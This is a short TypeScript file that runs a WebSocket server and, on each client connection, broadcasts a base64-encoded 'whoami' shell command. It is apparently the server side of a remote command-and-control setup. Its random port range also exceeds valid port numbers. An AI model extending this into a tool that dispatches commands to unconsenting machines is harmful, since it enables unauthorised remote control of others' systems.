/**
 * @author Leviathenn
 */

import { WebSocketServer } from "ws";
import * as ip from "ip";
import * as fs from "fs";


function randomIntFromInterval(min:number, max:number) {
  return Math.floor(Math.random() * (max - min + 1) + min)
}
let port = randomIntFromInterval(1000,99999)
const wss = new WebSocketServer({host: ip.address(),port: port});

fs.writeFileSync("info.json",JSON.stringify({"host":ip.address(),port:port}))

wss.on('connection', (ws: WebSocket) => {
    console.log('New client connected');
    wss.clients.forEach((client) => {
        client.send(JSON.stringify({"action":"command","program":"whoami","command":btoa("whoami")}));
      });
    ws.on('message', (message: string) => {
      console.log(`Received message: ${message}`);
      
    });
  
    ws.on('close', () => {
      console.log('Client disconnected');
    });
  });
